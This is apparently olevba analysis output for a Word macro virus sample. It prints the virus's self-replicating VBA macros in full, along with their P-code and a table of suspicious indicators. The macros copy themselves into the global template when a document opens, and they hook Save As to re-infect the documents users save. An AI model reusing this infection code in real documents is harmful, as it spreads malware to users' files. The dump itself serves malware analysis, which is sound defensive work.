olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nuclear.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nuclear.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Nuclear.z - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If CheckInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
End If
Rem WordBasic.Call "Payload"
End Sub

Private Function CheckInstalled()
Dim i
    'Check if AutoExec macro already exists.
    CheckInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Nuclear.z - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If CheckInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
End If
Rem WordBasic.Call "Payload"
End Sub

Private Function CheckInstalled()
Dim i
    'Check if AutoExec macro already exists.
    CheckInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Nuclear.z - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)    'declare dialog as type FileSaveAs
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg      'execute the dialog.

'Is the document of Type=(WordDocument or Template) ?

If (dlg.Format = 0) Or (dlg.Format = 1) Then

    'Copy Macro's from Global data area into document.
Rem     MacroCopy "Global:AutoExec",  WindowName$() + ":AutoExec", 1
Rem     MacroCopy "Global:AutoOpen",  WindowName$() + ":AutoOpen", 1
Rem     MacroCopy "Global:FileSaveAs", WindowName$() + ":FileSaveAs", 1
Rem     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro", 1
Rem     MacroCopy "Global:FilePrint", WindowName$() + ":FilePrint", 1
Rem     MacroCopy "Global:FilePrintDefault", WindowName$() + ":FilePrintDefault", 1
Rem     MacroCopy "Global:InsertPayload", WindowName$() + ":InsertPayload", 1
Rem     MacroCopy "Global:Payload", WindowName$() + ":Payload", 1

   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
Rem     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro"
Rem    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint"
    WordBasic.MacroCopy "Global:FilePrintDefault", WordBasic.[WindowName$]() + ":FilePrintDefault"
    WordBasic.MacroCopy "Global:InsertPayload", WordBasic.[WindowName$]() + ":InsertPayload"
    WordBasic.MacroCopy "Global:Payload", WordBasic.[WindowName$]() + ":Payload"

    'Set to save document as a template.
    dlg.Format = 1
End If

WordBasic.FileSaveAs dlg  'save the document infected.
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nuclear.z
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AutoExec - 2347 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld CheckInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #4:
' 	Rem 0x0044 "     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro", 1"
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitStr 0x0010 "Global:FilePrint"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0011 ":FilePrintDefault"
' 	Add 
' 	LitStr 0x0017 "Global:FilePrintDefault"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000E ":InsertPayload"
' 	Add 
' 	LitStr 0x0014 "Global:InsertPayload"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0008 ":PayLoad"
' 	Add 
' 	LitStr 0x000E "Global:Payload"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Rem 0x0019 " WordBasic.Call "Payload""
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Private Function CheckInstalled())
' Line #16:
' 	Dim 
' 	VarDefn i
' Line #17:
' 	QuoteRem 0x0004 0x0027 "Check if AutoExec macro already exists."
' Line #18:
' 	LitDI2 0x0000 
' 	St CheckInstalled 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #21:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoExec"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	St CheckInstalled 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndFunc 
' Macros/VBA/AutoOpen - 2351 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld CheckInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #4:
' 	Rem 0x0041 "     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro""
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitStr 0x0010 "Global:FilePrint"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0011 ":FilePrintDefault"
' 	Add 
' 	LitStr 0x0017 "Global:FilePrintDefault"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000E ":InsertPayload"
' 	Add 
' 	LitStr 0x0014 "Global:InsertPayload"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0008 ":PayLoad"
' 	Add 
' 	LitStr 0x000E "Global:Payload"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Rem 0x0019 " WordBasic.Call "Payload""
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Private Function CheckInstalled())
' Line #16:
' 	Dim 
' 	VarDefn i
' Line #17:
' 	QuoteRem 0x0004 0x0027 "Check if AutoExec macro already exists."
' Line #18:
' 	LitDI2 0x0000 
' 	St CheckInstalled 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #21:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoExec"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	St CheckInstalled 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndFunc 
' Macros/VBA/FileSaveAs - 3537 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' 	QuoteRem 0x0049 0x0021 "declare dialog as type FileSaveAs"
' Line #3:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #4:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x0025 0x0013 "execute the dialog."
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0034 "Is the document of Type=(WordDocument or Template) ?"
' Line #7:
' Line #8:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #9:
' Line #10:
' 	QuoteRem 0x0004 0x0031 "Copy Macro's from Global data area into document."
' Line #11:
' 	Rem 0x0041 "     MacroCopy "Global:AutoExec",  WindowName$() + ":AutoExec", 1"
' Line #12:
' 	Rem 0x0041 "     MacroCopy "Global:AutoOpen",  WindowName$() + ":AutoOpen", 1"
' Line #13:
' 	Rem 0x0044 "     MacroCopy "Global:FileSaveAs", WindowName$() + ":FileSaveAs", 1"
' Line #14:
' 	Rem 0x0044 "     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro", 1"
' Line #15:
' 	Rem 0x0042 "     MacroCopy "Global:FilePrint", WindowName$() + ":FilePrint", 1"
' Line #16:
' 	Rem 0x0050 "     MacroCopy "Global:FilePrintDefault", WindowName$() + ":FilePrintDefault", 1"
' Line #17:
' 	Rem 0x004A "     MacroCopy "Global:InsertPayload", WindowName$() + ":InsertPayload", 1"
' Line #18:
' 	Rem 0x003E "     MacroCopy "Global:Payload", WindowName$() + ":Payload", 1"
' Line #19:
' Line #20:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Rem 0x0041 "     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro""
' Line #24:
' 	Rem 0x0054 "    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint""
' Line #25:
' 	LitStr 0x0017 "Global:FilePrintDefault"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0011 ":FilePrintDefault"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	LitStr 0x0014 "Global:InsertPayload"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000E ":InsertPayload"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	LitStr 0x000E "Global:Payload"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0008 ":Payload"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' Line #29:
' 	QuoteRem 0x0004 0x0023 "Set to save document as a template."
' Line #30:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x001A 0x001B "save the document infected."
' Line #34:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

